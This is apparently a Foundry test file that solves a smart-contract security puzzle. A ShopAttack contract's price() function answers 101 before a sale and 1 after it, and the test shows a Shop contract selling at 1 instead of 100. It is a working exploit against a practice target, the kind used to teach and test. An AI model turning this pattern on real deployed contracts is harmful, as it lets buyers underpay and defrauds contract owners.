// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Buyer, Shop} from "../src/Shop.sol";

contract ShopAttack is Buyer {
    Shop private p_shop;

    constructor(Shop _shop) {
        p_shop = _shop;
    }

    function buy() public {
        p_shop.buy();
    }

    function price() external view override returns (uint256) {
        return p_shop.isSold() ? 1 : 101;
    }
}

contract shopTest is Test {
    Shop public shop;
    ShopAttack public shopAttack;

    address alice = address(1);

    function setUp() public {
        shop = new Shop();
        shopAttack = new ShopAttack(shop);
    }

    function testAttack() public {
        assertEq(shop.price(), 100);
        shopAttack.buy();
        assertEq(shop.price(), 1);
    }
}
